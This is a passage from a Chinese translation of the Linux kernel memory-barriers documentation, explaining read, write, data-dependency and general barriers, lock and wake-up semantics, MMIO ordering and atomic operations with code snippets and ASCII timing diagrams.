控制依赖--------------------
控制依赖需要一个完整的读内存屏障，而不是简单的数据依赖屏障，来保证其正确性。考虑下面的代码：
	q = &a;
	if (p)
		q = &b;
	<data dependency barrier>
	x = *q;
这将无法预测结果，因为这里没有实际数据依赖，而是一个控制依赖。CPU可能通过提前预测结果从而对if语句短路。在这样的情况下，实际需要的是下面的代码：
	q = &a;
	if (p)
		q = &b;
	<read barrier>
	x = *q;
SMP屏障配对-------------------
当处理的CPU之间的交互时，相应类型的内存屏障总是成对出现。缺少恰当的配对屏障几乎可以肯定是错误的。
写屏障应始终与数据依赖屏障或者读屏障配对，虽然通用内存屏障也是可行的。同样一个读屏障至少也始终搭配数据依赖屏障或者写屏障，通用屏障任然可行：
	CPU 1		CPU 2
	===============	===============
	a = 1;
	<write barrier>
	b = 2;		x = b;
			<read barrier>
			y = a;
或者:
	CPU 1		CPU 2
	===============	===============================
	a = 1;
	<write barrier>
	b = &a;		x = b;
			<data dependency barrier>
			y = *x;
基本上，读屏障总是必须在那里，尽管它可以“弱“类型。
[！]注意：写屏障之前的store指令通常与读屏障或数据依赖屏障后的load相匹配，反之亦然：
 
	CPU 1                           CPU 2
	===============                 ===============
	a = 1;           }----   --->{  v = c
	b = 2;           }    \ /    {  w = d
	<write barrier>        \        <read barrier>
	c = 3;           }    / \    {  x = a;
	d = 4;           }----   --->{  y = b;
 
内存屏障序列实例------------------------------------
首先，写屏障作用与是确保部分store指令有序。考虑以下的事件序列：
	CPU 1
	=======================
	STORE A = 1
	STORE B = 2
	STORE C = 3
	<write barrier>
	STORE D = 4
	STORE E = 5
这一连串的事件按顺序提交到内存一致性系统，系统其他组件可能感知的是无序的集合{ STORE A,STORE B, STORE C } 的操作都发生在无序集 { STORE D, STORE E}之前:
 
	+-------+       :      :
	|       |       +------+
	|       |------>| C=3  |     }     /\
	|       |  :    +------+     }-----  \  -----> Events perceptible to
	|       |  :    | A=1  |     }        \/       the rest of the system
	|       |  :    +------+     }
	| CPU 1 |  :    | B=2  |     }
	|       |       +------+     }
	|       |   wwwwwwwwwwwwwwww }   <--- At this point the write barrier
	|       |       +------+     }        requires all stores prior to the
	|       |  :    | E=5  |     }        barrier to be committed before
	|       |  :    +------+     }        further stores may take place
	|       |------>| D=4  |     }
	|       |       +------+
	+-------+       :      :
	                   |
	                   | Sequence in which stores are committed to the
	                   | memory system by CPU 1
	                   V
其次，数据依赖屏障确保于有数据依赖关系的load指令的局部有序。考虑以下的事件序列：
 
	CPU 1			CPU 2
	=======================	=======================
		{ B = 7; X = 9; Y = 8; C = &Y }
	STORE A = 1
	STORE B = 2
	<write barrier>
	STORE C = &B		LOAD X
	STORE D = 4		LOAD C (gets &B)
				LOAD *C (reads B)
没有干预的场景，尽管CPU 1有写屏障，CPU2感知到的CPU1的顺序是随机的：
 
	+-------+       :      :                :       :
	|       |       +------+                +-------+  |  
	|       |------>| B=2  |-----       --->| Y->8  |  | 
	|       |  :    +------+     \          +-------+  |  (CPU2 感知的更新顺序)
	| CPU 1 |  :    | A=1  |      \     --->| C->&Y |  V
	|       |       +------+       |        +-------+
	|       |   wwwwwwwwwwwwwwww   |        :       :
	|       |       +------+       |        :       :
	|       |  :    | C=&B |---    |        :       :       +-------+
	|       |  :    +------+   \   |        +-------+       |       |
	|       |------>| D=4  |    ----------->| C->&B |------>|       |
	|       |       +------+       |        +-------+       |       |
	+-------+       :      :       |        :       :       |       |
	                               |        :       :       |       |
	                               |        :       :       | CPU 2 |
	                               |        +-------+       |       |
	    B的赋值显然是错误的    --->  |        | B->7  |------>|       |
	                               |        +-------+       |       |
	                               |        :       :       |       |
	                               |        +-------+       |       |
	    对X的load操作        --->    \       | X->9  |------>|       |
	    延迟对B一致性的维护            \      +-------+       |       |
	                                  ----->| B->2  |       +-------+
	                                        +-------+
	                                        :       :
在上述的例子中，尽管load *Ç（也就是B）在load C之后，CPU 2感知到的B是7；
然而，在CPU2 中如果数据依赖屏障放置在loadC和load *C（即：B）之间：
 
	CPU 1			CPU 2
	=======================	=======================
		{ B = 7; X = 9; Y = 8; C = &Y }
	STORE A = 1
	STORE B = 2
	<write barrier>
	STORE C = &B		LOAD X
	STORE D = 4		LOAD C (gets &B)
				<data dependency barrier>
				LOAD *C (reads B)
那么将发生以下情况：
 
	+-------+       :      :                :       :
	|       |       +------+                +-------+
	|       |------>| B=2  |-----       --->| Y->8  |
	|       |  :    +------+     \          +-------+
	| CPU 1 |  :    | A=1  |      \     --->| C->&Y |
	|       |       +------+       |        +-------+
	|       |   wwwwwwwwwwwwwwww   |        :       :
	|       |       +------+       |        :       :
	|       |  :    | C=&B |---    |        :       :       +-------+
	|       |  :    +------+   \   |        +-------+       |       |
	|       |------>| D=4  |    ----------->| C->&B |------>|       |
	|       |       +------+       |        +-------+       |       |
	+-------+       :      :       |        :       :       |       |
	                               |        :       :       |       |
	                               |        :       :       | CPU 2 |
	                               |        +-------+       |       |
	                               |        | X->9  |------>|       |
	                               |        +-------+       |       |
	  Makes sure all effects --->   \   ddddddddddddddddd   |       |
	  prior to the store of C        \      +-------+       |       |
	  are perceptible to              ----->| B->2  |------>|       |
	  subsequent loads                      +-------+       |       |
	                                        :       :       +-------+
第三，读屏障确保load指定部分有序。考虑以下的事件序列：
	CPU 1			CPU 2
	=======================	=======================
		{ A = 0, B = 9 }
	STORE A=1
	<write barrier>
	STORE B=2
				LOAD B
				LOAD A
没有干预的情况下，CPU 2对CPU 1中事件的感知是随机的，尽管CPU 1有一个写屏障：
	+-------+       :      :                :       :
	|       |       +------+                +-------+
	|       |------>| A=1  |------      --->| A->0  |
	|       |       +------+      \         +-------+
	| CPU 1 |   wwwwwwwwwwwwwwww   \    --->| B->9  |
	|       |       +------+        |       +-------+
	|       |------>| B=2  |---     |       :       :
	|       |       +------+   \    |       :       :       +-------+
	+-------+       :      :    \   |       +-------+       |       |
	                             ---------->| B->2  |------>|       |
	                                |       +-------+       | CPU 2 |
	                                |       | A->0  |------>|       |
	                                |       +-------+       |       |
	                                |       :       :       +-------+
	                                 \      :       :
	                                  \     +-------+
	                                   ---->| A->1  |
	                                        +-------+
	                                        :       :
 
然而，如果在CPU2 loadA 和loadB之间放置一个读屏障：
 
	CPU 1			CPU 2
	=======================	=======================
		{ A = 0, B = 9 }
	STORE A=1
	<write barrier>
	STORE B=2
				LOAD B
				<read barrier>
				LOAD A
CPU2将可以正确的感知CPU1的顺序：
 
	+-------+       :      :                :       :
	|       |       +------+                +-------+
	|       |------>| A=1  |------      --->| A->0  |
	|       |       +------+      \         +-------+
	| CPU 1 |   wwwwwwwwwwwwwwww   \    --->| B->9  |
	|       |       +------+        |       +-------+
	|       |------>| B=2  |---     |       :       :
	|       |       +------+   \    |       :       :       +-------+
	+-------+       :      :    \   |       +-------+       |       |
	                             ---------->| B->2  |------>|       |
	                                |       +-------+       | CPU 2 |
	                                |       :       :       |       |
	                                |       :       :       |       |
	  At this point the read ---->   \  rrrrrrrrrrrrrrrrr   |       |
	  barrier causes all effects      \     +-------+       |       |
	  prior to the storage of B        ---->| A->1  |------>|       |
	  to be perceptible to CPU 2            +-------+       |       |
	                                        :       :       +-------+
 
为了更彻底说明这个问题，考虑读屏障的两侧都用load A指令的场景：
 
	CPU 1			CPU 2
	=======================	=======================
		{ A = 0, B = 9 }
	STORE A=1
	<write barrier>
	STORE B=2
				LOAD B
				LOAD A [first load of A]
				<read barrier>
				LOAD A [second load of A]
即使两个load A都发生在loadB之后，它们任然可能获得不同的值：
 
	+-------+       :      :                :       :
	|       |       +------+                +-------+
	|       |------>| A=1  |------      --->| A->0  |
	|       |       +------+      \         +-------+
	| CPU 1 |   wwwwwwwwwwwwwwww   \    --->| B->9  |
	|       |       +------+        |       +-------+
	|       |------>| B=2  |---     |       :       :
	|       |       +------+   \    |       :       :       +-------+
	+-------+       :      :    \   |       +-------+       |       |
	                             ---------->| B->2  |------>|       |
	                                |       +-------+       | CPU 2 |
	                                |       :       :       |       |
	                                |       :       :       |       |
	                                |       +-------+       |       |
	                                |       | A->0  |------>| 1st   |
	                                |       +-------+       |       |
	  At this point the read ---->   \  rrrrrrrrrrrrrrrrr   |       |
	  barrier causes all effects      \     +-------+       |       |
	  prior to the storage of B        ---->| A->1  |------>| 2nd   |
	  to be perceptible to CPU 2            +-------+       |       |
	                                        :       :       +-------+
 
在读屏障完成之前，CPU2 可能无法感知CPU1中A的更新
  
	+-------+       :      :                :       :
	|       |       +------+                +-------+
	|       |------>| A=1  |------      --->| A->0  |
	|       |       +------+      \         +-------+
	| CPU 1 |   wwwwwwwwwwwwwwww   \    --->| B->9  |
	|       |       +------+        |       +-------+
	|       |------>| B=2  |---     |       :       :
	|       |       +------+   \    |       :       :       +-------+
	+-------+       :      :    \   |       +-------+       |       |
	                             ---------->| B->2  |------>|       |
	                                |       +-------+       | CPU 2 |
	                                |       :       :       |       |
	                                 \      :       :       |       |
	                                  \     +-------+       |       |
	                                   ---->| A->1  |------>| 1st   |
	                                        +-------+       |       |
	                                    rrrrrrrrrrrrrrrrr   |       |
	                                        +-------+       |       |
	                                        | A->1  |------>| 2nd   |
	                                        +-------+       |       |
	                                        :       :       +-------+
如果load B == 2，可以保证第二次loadA总是等于 1。但是不能保证第一次load a的值，可能会出现的A == 0或A == 1。
读内存屏障与load预加载----------------------------------------
许多CPU都会预测并提前加载：即是当系统发现它需要从内存中加载一项数据的时候，系统会寻找没有其他load指令占用总线资源的时候提前加载 - 即使接下去执行的指令还没有到达load指令处。这使的部分load指令可能立即完成，因为CPU已经获得了值。
也可能CPU根本不会使用这个值，因为执行到另外的分支而不需要load - 在这种情况下，它可以丢弃该值或只是缓存供以后使用。
考虑下面的场景：
	CPU 1	   		CPU 2
	=======================	=======================
	 	   		LOAD B
	 	   		DIVIDE		} Divide instructions generally
	 	   		DIVIDE		} take a long time to perform
	 	   		LOAD A
可能出现：
	                                        :       :       +-------+
	                                        +-------+       |       |
	                                    --->| B->2  |------>|       |
	                                        +-------+       | CPU 2 |
	                                        :       :DIVIDE |       |
	                                        +-------+       |       |
	The CPU being busy doing a --->     --->| A->0  |~~~~   |       |
	division speculates on the              +-------+   ~   |       |
	LOAD of A                               :       :   ~   |       |
	                                        :       :DIVIDE |       |
	                                        :       :   ~   |       |
	Once the divisions are complete -->     :       :   ~-->|       |
	the CPU can then perform the            :       :       |       |
	LOAD with immediate effect              :       :       +-------+
如果在第二个LOAD指令之前，放置一个读屏障或者数据依赖屏障
 
	CPU 1	   		CPU 2
	=======================	=======================
	 	   		LOAD B
	 	   		DIVIDE
	 	   		DIVIDE
				<read barrier>
	 	   		LOAD A
 
 这在一定程度上根据使用的不同类型的屏障，需要考虑强制重新获取，如果值没有发送变化，则可以使用预取的值。
  
	                                        :       :       +-------+
	                                        +-------+       |       |
	                                    --->| B->2  |------>|       |
	                                        +-------+       | CPU 2 |
	                                        :       :DIVIDE |       |
	                                        +-------+       |       |
	The CPU being busy doing a --->     --->| A->0  |~~~~   |       |
	division speculates on the              +-------+   ~   |       |
	LOAD of A                               :       :   ~   |       |
	                                        :       :DIVIDE |       |
	                                        :       :   ~   |       |
	                                        :       :   ~   |       |
	                                    rrrrrrrrrrrrrrrr~   |       |
	                                        :       :   ~   |       |
	                                        :       :   ~-->|       |
	                                        :       :       |       |
	                                        :       :       +-------+
但如果另一个CPU更新或者失效之后，就必须重新加载值：
 
	                                        :       :       +-------+
	                                        +-------+       |       |
	                                    --->| B->2  |------>|       |
	                                        +-------+       | CPU 2 |
	                                        :       :DIVIDE |       |
	                                        +-------+       |       |
	The CPU being busy doing a --->     --->| A->0  |~~~~   |       |
	division speculates on the              +-------+   ~   |       |
	LOAD of A                               :       :   ~   |       |
	                                        :       :DIVIDE |       |
	                                        :       :   ~   |       |
	                                        :       :   ~   |       |
	                                    rrrrrrrrrrrrrrrrr   |       |
	                                        +-------+       |       |
	The speculation is discarded --->   --->| A->1  |------>|       |
	and an updated value is                 +-------+       |       |
	retrieved                               :       :       +-------+
传递性------------
传递性是对顺序一个深刻直观的概念，但是真实的计算机系统往往并不保证。下面的例子演示传递性（也可称为“积累规律cumulativity”）：
	CPU 1			CPU 2			CPU 3
	=======================	=======================	=======================
		{ X = 0, Y = 0 }
	STORE X=1		LOAD X			STORE Y=1
				<general barrier>	<general barrier>
				LOAD Y			LOAD X
假设CPU 2 的load X返回1及load Y返回0。这表明，在某些情况下CPU 2的LOAD X在CPU 1 store X之后，在CPU3 store y 之前。问题是“CPU 3的 load X是否可能返回0？”
因为CPU 2的load X在某种情况下在CPU 1的store之后，我们很自然地希望CPU 3的load X也必须返回1。我们期望的就是传递性的一个例子：如果在CPU A上执行的一个load指令，随后在CPU B 在又对相同变量的load指令，此时CPU A的load和CPU B的load指令必须返回相同的值。
在Linux内核中，使用通用内存屏障保证传递。因此，在上面的例子中，如果从CPU 2的load X指令返回1，并且其load Y返回0，那么CPU 3的load X必须返回1。
但是，读或写屏障不保证传递性。例如，在下面的例子中把在上述例子中的通用屏障改变读屏障，如下所示：
 
	CPU 1			CPU 2			CPU 3
	=======================	=======================	=======================
		{ X = 0, Y = 0 }
	STORE X=1		LOAD X			STORE Y=1
				<read barrier>		<general barrier>
				LOAD Y			LOAD X
此替换破坏了传递性，在本例中，CPU 2的load X返回1，load Y返回0，但是CPU 3的load X返回0是完全合法的。
关键的问题是，虽然CPU 2的读屏障保证了load指令的顺序，但是它并不能保证CPU 1的store顺序，如果这个例子运行在CPU 1和2共享store 缓冲区或者某一级缓存，CPU 2可能会提前获得到CPU 1写入的值。因此，通用屏障需要确保所有的CPU都能感知CPU 1和CPU 2的访问顺序。
要重申的是，如果你的代码需要传递性，请使用通用屏障。
========================显式内核屏障========================
Linux内核有多种不同的屏障，工作在不同的层上：
  （*）编译器屏障。
  （*）CPU内存屏障。
  （*）MMIO写屏障。
编译器屏障----------------
Linux内核有一个显式的编译器的屏障函数，防止编译器优化时将内存访问从任一侧到另一侧
 barrier();
这是一个通用屏障 - 不存在弱类型的编译屏障。
编译屏障并不直接影响CPU，CPU依然可以按照它所希望的重新排序。
CPU内存屏障-------------------
Linux内核有8个基本的CPU内存屏障：
	TYPE		MANDATORY		SMP CONDITIONAL
	===============	=======================	===========================
	GENERAL		mb()			smp_mb()
	WRITE		wmb()			smp_wmb()
	READ		rmb()			smp_rmb()
	DATA DEPENDENCY	read_barrier_depends()	smp_read_barrier_depends()
除了数据依赖屏障之外的所有屏障都实现类似编译器屏障的功能。数据依赖关系不对编译器产生的顺序有任务额外的影响。
旁白：在数据依赖的情况下，编译器有望发出正确的load顺序（如:一个'a[b]' 将会在load a[b]之前load b），但在C规范下并不能确保如此，编译器可能预先推测b的值（比如：是否等于1），然后在load b之前load a（如： tmp =a [1];if（b！= 1）TMP = a[b]）。即便在编译器load a[b]之后重新load b问题依然存在，因为b拥有比a[b]更新的副本。关于这些问题尚未达成一个共识，然而ACCESS_ONCE宏是解决这个问题很好的开始。
在单处理器编译系统中SMP内存屏障将退化为编译屏障，因为它假定CPU可以保证自身的一致性，并且以正确的顺序访问内存。
[！]注意：SMP内存屏障必须用在SMP系统中来控制引用共享内存的顺序，使用锁也可以满足需求。
强制性屏障不应该被用来控制SMP，因为强制屏障在UP系统中会产生过多不必要的开销。但是，他们可以用于控制在通过松散内存I / O窗口访问时的MMIO操作。即使在非SMP系统中，他们也是必须的，因为它们可以禁止编译器和CPU的重排从而影响内存访问顺序。
下面是更高级的屏障函数：
 (*) set_mb(var, value)
     这个函数值赋给变量，然后插入一个完整的内存屏障，根据不同的实现。在UP编译器中它不能保证插入编译器屏障之外的屏障。
 (*) smp_mb__before_atomic_dec();
 (*) smp_mb__after_atomic_dec();
 (*) smp_mb__before_atomic_inc();
 (*) smp_mb__after_atomic_inc();
 
     这些都为原子加，减，递增和递减而使用的， 函数无返回值，主要用于引用计数。这些函数并不实现内存屏障。
    作为一个例子，考虑下面的代码片段，它表示一个对象已经删除， 然后对该对象的引用计数减1：
	obj->dead = 1;
	smp_mb__before_atomic_dec();
	atomic_dec(&obj->ref_count);
这可以确保对对象的死亡标志在引用计数递减之前；
更多信息参见Documentation/atomic_ops.txt ，并在Atomic operations 章节介绍了它的使用场景。
 (*) smp_mb__before_clear_bit(void);
 (*) smp_mb__after_clear_bit(void);
这些类似于原子自增，自减屏障。他们典型的应用场景是按位解锁操作，但是必须注意他们也没有实现内存屏障。
考虑通过清除一个lock 位来实现解锁操作。 clear_bit（）函数将需要使用内存屏障：
	smp_mb__before_clear_bit();
	clear_bit( ... );
这可以防止在清除lock标志位之前的内存操作在之后执行。对于UNLOCK的实现见“锁的功能”章节
更多信息见Documentation/atomic_ops.txt ，并且在 “原子操作“章节有关于使用场景的介绍；
MMIO写屏障------------------
对于映射为内存访问的I / O写操作，Linux内核有一个特殊的障碍；
mmiowb（）;
这是一个强制性写屏障的变体，能够确保I / O区域部分弱有序。其影响可能超越CPU和硬件之间的接口，在一定程度上实际影响到硬件。
更多信息参见“锁与I / O访问”章节。
===============================隐式内核内存屏障===============================
在Linux内核中的一些其他的功能也实现内存屏障，其中包括锁和调度功能。
该规范是一个的最低限度的保证，有些特定的体系结构可能提供更多的保证，但是在特定体系结构之外不能依赖他们。
锁功能：-----------------
Linux内核有很多锁结构：
 （*）自旋锁 （*）R / W自旋锁 （*）互斥 （*）信号量 （*）R / W信号量 （*）RCU
在所有的情况下，他们都是LOCK操作和UNLOCK操作的变种。这些操作都隐含着特定的屏障：
（1）锁定操作的含义：
     在LOCK操作之后的内存操作一定在LOCK操作完成之后完成；
     在LOCK操作之前的内存操作可能在LOCK操作完成之后完成；
 （2）解锁操作的含义：
     在UNLOCK操作之前的内存操作一定在UNLOCK操作完成之前完成；
     在UNLOCK操作之后的内存操作可能在UNLOCK操作完成之前完成；
 （3）锁与锁的含义：
     在一个LOCK之前的其他LOCK操作一定在该LOCK完成之前完成；
 （4）锁定与解锁的含义：
     在一个UNLOCK之前的其他所有LOCK操作一定在该UNLOCK完成之前完成；
     在一个LOCK之前的其他所有UNLOCK操作一定在该LOCK完成之前完成；
 （5）条件锁失败的含义：
     某些锁操作的变种可能会失败，比如可能是由于无法立即获得锁，或者在睡眠等待锁可用的时候收到一个unblocked信号。失败的锁操作不隐含任何形式的屏障。
 因此，根据（1），（2）和（4）可以得出一个无条件的LOCK后面跟着一个UNLOCK操作相当于一个完整的屏障，但一个UNLOCK后面跟着一个LOCK却不是；
[！]注意：使用锁的一个结果是，因为LOCK和UNLOCK都只能单向的屏障，关键指令以外的指令可能渗入关键部分里面执行。
一个UNLOCK后面跟着一个LOCK不是一个完成的屏障是因为可能一个在LOCK之前的内存操作发生在LOCK之后，并且一个UNLOCK之后的操作可能在UNLOCK之前发生，两个访问可能再交叉：
	*A = a;
	LOCK
	UNLOCK
	*B = b;
可能会发生：
	LOCK, STORE *B, STORE *A, UNLOCK
锁和信号量在UP编译系统中不保证任何顺序，所以在这种情况下根本不能考虑为屏障，- 尤其是对于I / O访问 - 除非结合与中断禁用操作。
更多信息请参阅“CPU之间的锁屏障”章节。
考虑下面的例子：
	*A = a;
	*B = b;
	LOCK
	*C = c;
	*D = d;
	UNLOCK
	*E = e;
	*F = f;
以下的顺序是可以接受的：
	LOCK, {*F,*A}, *E, {*C,*D}, *B, UNLOCK
	[+] Note that {*F,*A} indicates a combined access.
但有下列情形的，是不能接受的：
	{*F,*A}, *B,	LOCK, *C, *D,	UNLOCK, *E
	*A, *B, *C,	LOCK, *D,	UNLOCK, *E, *F
	*A, *B,		LOCK, *C,	UNLOCK, *D, *E, *F
	*B,		LOCK, *C, *D,	UNLOCK, {*F,*A}, *E
 禁止中断功能
-----------------------------
禁止中断（等价于锁）和允许中断（等价于解锁）可以充当编译屏障。所以，如果某些场景下需要内存或I / O屏障，它们必须通过其他的手段来提供。
休眠和唤醒功能---------------------------
在一个被标记在全局数据上的某个事件的休眠和唤醒可以被看作是一个是两块数据之间的交互：正在等待的任务的状态和标记这个事件的全局数据。为了确保正确的顺序，进入休眠的原语和唤醒的原语都意味着某些屏障。
首先，通常一个休眠任务执行类似如下的事件序列：
	for (;;) {
		set_current_state(TASK_UNINTERRUPTIBLE);
		if (event_indicated)
			break;
		schedule();
	}
当set_current_state（）执行后，任务状态发生变化，它会自动插入一个通用内存屏障；    
	CPU 1
	===============================
	set_current_state();
	  set_mb();
	    STORE current->state
	    <general barrier>
	LOAD event_indicated
set_current_state（）可能包含在下面的函数中：
	prepare_to_wait();
	prepare_to_wait_exclusive();
因此这些函数也意味在设置状态后有一个通用内存屏障。上面的各个函数有被包含在其他函数中，所有这些函数都在对应的地方插入内存屏障；
	wait_event();
	wait_event_interruptible();
	wait_event_interruptible_exclusive();
	wait_event_interruptible_timeout();
	wait_event_killable();
	wait_event_timeout();
	wait_on_bit();
	wait_on_bit_lock();
其次，执行正常唤醒的代码如下：
	event_indicated = 1;
	wake_up(&event_wait_queue);
或：
	event_indicated = 1;
	wake_up_process(event_daemon);
类似wake_up（）的函数都暗含一个内存屏障。当且仅当他们唤醒某个任务的时候。任务状态被清除之前内存屏障执行，也即是在设置唤醒标志事件的store操作和设置TASK_RUNNING的store操作之间：
	CPU 1				CPU 2
	===============================	===============================
	set_current_state();		STORE event_indicated
	  set_mb();			wake_up();
	    STORE current->state	  <write barrier>
	    <general barrier>		  STORE current->state
	LOAD event_indicated
可用唤醒函数包括：
	complete();
	wake_up();
	wake_up_all();
	wake_up_bit();
	wake_up_interruptible();
	wake_up_interruptible_all();
	wake_up_interruptible_nr();
	wake_up_interruptible_poll();
	wake_up_interruptible_sync();
	wake_up_interruptible_sync_poll();
	wake_up_locked();
	wake_up_locked_poll();
	wake_up_nr();
	wake_up_poll();
	wake_up_process();
[！]注意：在休眠任务执行set_current_state（）之后，唤醒任务load这些store指令之前，休眠任务和唤醒任务的内存屏障都不能保证多个store指令的顺序。例如：休眠函数如下
	set_current_state(TASK_INTERRUPTIBLE);
	if (event_indicated)
		break;
	__set_current_state(TASK_RUNNING);
	do_something(my_data);
和唤醒函数如下：
	my_data = value;
	event_indicated = 1;
	wake_up(&event_wait_queue);
并不能保证休眠函数在对my_data做过修改之后能够感知到event_indicated的变化。在这种情况下，在两侧的代码中必须在隔离的数据访问中插入它自己的内存屏障。因此，上面的休眠任务应该这样：
	set_current_state(TASK_INTERRUPTIBLE);
	if (event_indicated) {
		smp_rmb();
		do_something(my_data);
	}
并唤醒者应该做的：
	my_data = value;
	smp_wmb();
	event_indicated = 1;
	wake_up(&event_wait_queue);
其他函数-----------------------
其他隐含类内存屏障的函数：
 （*）schedule（）实现类似完整内存屏障。
=================================CPU之间的锁的屏障效应=================================
在SMP系统中，锁原语提供了更加丰富的屏障类型：其中一种在特定的锁冲突的情况下会影响其它CPU上的内存访问顺序。
 
锁与内存访问------------------------
考虑下面的场景：系统有一对自旋锁（M）、（Q）和三个CPU，然后发生以下的事件序列：
	CPU 1				CPU 2
	===============================	===============================
	*A = a;				*E = e;
	LOCK M				LOCK Q
	*B = b;				*F = f;
	*C = c;				*G = g;
	UNLOCK M			UNLOCK Q
	*D = d;				*H = h;
对CPU 3来说从 *A到*H的顺序是没有保证的，不同于单独的锁在单独的CPU上的作用。例如，它可能感知的顺序如下：
	*E, LOCK M, LOCK Q, *G, *C, *F, *A, *B, UNLOCK Q, *D, *H, UNLOCK M
但它不会看到任何下面的场景：
	*B, *C or *D 在 LOCK M 之前
	*A, *B or *C 在 UNLOCK M 之后
	*F, *G or *H 在 LOCK Q 之前
	*E, *F or *G 在 UNLOCK Q 之后
但是，如果发生以下情况：
 
	CPU 1				CPU 2
	===============================	===============================
	*A = a;
	LOCK M		[1]
	*B = b;
	*C = c;
	UNLOCK M	[1]
	*D = d;				*E = e;
					LOCK M		[2]
					*F = f;
					*G = g;
					UNLOCK M	[2]
					*H = h;
CPU 3可能会看到：
	*E, LOCK M [1], *C, *B, *A, UNLOCK M [1],
		LOCK M [2], *H, *F, *G, UNLOCK M [2], *D
但是，假设CPU 1先得到锁，CPU 3将不会看到任何下面的场景：
	*B, *C, *D, *F, *G or *H 在 LOCK M [1] 之前
	*A, *B or *C 在  UNLOCK M [1] 之后
	*F, *G or *H 在 LOCK M [2] 之前
	*A, *B, *C, *E, *F or *G 在 UNLOCK M [2] 之后
锁与 I / O访问
---------------------
在某些情况下（尤其是涉及NUMA）在两个不同CPU上的两个自旋锁临界区内的I / O访问，在PCI桥看来可能是交叉的，因为PCI桥不一定保证缓存一致性，此时内存屏障将失效。
例如：
	CPU 1				CPU 2
	===============================	===============================
	spin_lock(Q)
	writel(0, ADDR)
	writel(1, DATA);
	spin_unlock(Q);
					spin_lock(Q);
					writel(4, ADDR);
					writel(5, DATA);
					spin_unlock(Q);
PCI桥可能看到的顺序如下所示：
	STORE *ADDR = 0, STORE *ADDR = 4, STORE *DATA = 1, STORE *DATA = 5
这可能会导致硬件故障。
此时在释放自旋锁之前需要插入mmiowb（）函数，例如：
	CPU 1				CPU 2
	===============================	===============================
	spin_lock(Q)
	writel(0, ADDR)
	writel(1, DATA);
	mmiowb();
	spin_unlock(Q);
					spin_lock(Q);
					writel(4, ADDR);
					writel(5, DATA);
					mmiowb();
					spin_unlock(Q);
这将确保在CPU 1上的两次store比CPU 2上的两次store操作先被PCI感知。
此外，相同的设备上如果store指令后跟随一个load指令，可以省去mmiowb（）函数，因为load强制在load执行前store指令必须完成
	CPU 1				CPU 2
	===============================	===============================
	spin_lock(Q)
	writel(0, ADDR)
	a = readl(DATA);
	spin_unlock(Q);
					spin_lock(Q);
					writel(4, ADDR);
					b = readl(DATA);
					spin_unlock(Q);
更多信息参见：Documentation/DocBook/deviceiobook.tmpl
=================================什么时候需要内存障碍？=================================
在正常操作情况下，一个单线程代码片段中内存操作重新排序一般不会产生问题，仍然可以正常工作，即使是在一个SMP内核系统中也是如此。但是，下面四种场景下，重新排序肯定会引发问题：
 （*）多理器间的交互。
 （*）原子操作。
 （*）设备访问。
 （*）中断。
多理器间的交互--------------------------
当有一个系统具有一个以上的处理器，系统中多个CPU可能在同一时间访问处理同一数据集。这可能会导致同步的问题，通常处理这种场景使用锁。然而，锁是相当昂贵的，所以如果有其他的选择尽量不使用锁，在这种情况下，多CPU的操作可能要仔细排列的，以防止故障。
例如，在R / W信号量慢的路径的场景。这里有一个waiter进程在信号量上排队，并且它的堆栈上的一块空间链接到信号量上的等待进程列表：
	struct rw_semaphore {
		...
		spinlock_t lock;
		struct list_head waiters;
	};
	struct rwsem_waiter {
		struct list_head list;
		struct task_struct *task;
	};
要唤醒一个特定的waiter进程，up_read（）或up_write（）函数必须如下：
 （1）读取waiter记录的next指针，获取下一个waiter记录的地址；
 （2）读取waiter的task结构的指针;
 （3）清除task指针，通知waiter已经获取信号量
 （4）调用task的wake_up_process（）函数;
 （5）释放指向waiter的task结构的引用。
换句话说，它必须执行下面的事件：
	LOAD waiter->list.next;
	LOAD waiter->task;
	STORE waiter->task;
	CALL wakeup
	RELEASE task
如果这些步骤的顺序发生任何改变，那么整个事情会出问题。
一旦进程将自己排队并且释放信号锁，waiter将不再获得锁，它只需要等待它的任务指针被清零，然后继续执行。由于记录在waiter的堆栈上，这意味着如果在列表中的next指针读取之前，task指针被清零，另一个CPU可能会开始处理，up*（）函数在有机会读取next指针之前waiter的堆栈就被修改。
考虑上述事件序列可能发生什么：
	CPU 1				CPU 2
	===============================	===============================
					down_xxx()
					Queue waiter
					Sleep
	up_yyy()
	LOAD waiter->task;
	STORE waiter->task;
					Woken up by other event
	<preempt>
					Resume processing
					down_xxx() returns
					call foo()
					foo() clobbers *waiter
	</preempt>
	LOAD waiter->list.next;
	--- OOPS ---
虽然这中场景可以使用的信号锁处理，但在唤醒后的down_xxx（）函数不必要的再次获得自旋锁。
这个问题可以通过插入一个通用的SMP内存屏障处理：
	LOAD waiter->list.next;
	LOAD waiter->task;
	smp_mb();
	STORE waiter->task;
	CALL wakeup
	RELEASE task
在这种情况下，即是是在其他的CPU上，屏障确保所有在屏障之前的内存操作一定能够在屏障之后的内存操作先执行，但是它不能确保所有在屏障之前的内存操作一定先于屏障指令身执行完成时执行；
在一个UP系统 ， 这种场景不会产生问题 ， smp_mb（）仅仅是一个编译屏障，可以确保编译器产生正确的顺序，不实际干预CPU，在只有一个CPU的时候，CPU的依赖顺序逻辑会打理好一切；
原子操作-----------------
虽然它们在技术上考虑了处理器间的交互，但是特别注意，原子操作中的有一些隐含完整的内存屏障，另外一些却不包含，但是他们作为一个整体在内存中应用广泛；
许多原子操作，修改内存中一些状态的值，并返回有关状态（新的或旧的）的信息，这意味着在实际操作（明确的lock操作除外）的两侧插入一个SMP条件通用内存屏障（smp_mb()），包括；
	xchg();
	cmpxchg();
	atomic_cmpxchg();
	atomic_inc_return();
	atomic_dec_return();
	atomic_add_return();
	atomic_sub_return();
	atomic_inc_and_test();
	atomic_dec_and_test();
	atomic_sub_and_test();
	atomic_add_negative();
	atomic_add_unless();	/* when succeeds (returns 1) */
	test_and_set_bit();
	test_and_clear_bit();
	test_and_change_bit();
他们都是用于实现诸如LOCK和UNLOCK的操作，和判断引用计数器决定对象销毁，作为隐含的内存障碍是必要的。
下面的操作存在潜在的问题，因为他们并没有实现内存障碍，但可能被用于执行诸如解锁的操作：
	atomic_set();
	set_bit();
	clear_bit();
	change_bit();
如果有必要，这些应使用适当显示内存屏障（例如：smp_mb__before_clear_bit（））。
下面这些也没有实现内存屏障，因此在某些场景下可能需要明确的内存屏障（例如：smp_mb__before_atomic_dec（））：
	atomic_add();
	atomic_sub();
	atomic_inc();
	atomic_dec();
如果他们用于统计，那么他们可能并不需要内存屏障，除非和统计数据之间的有耦合。
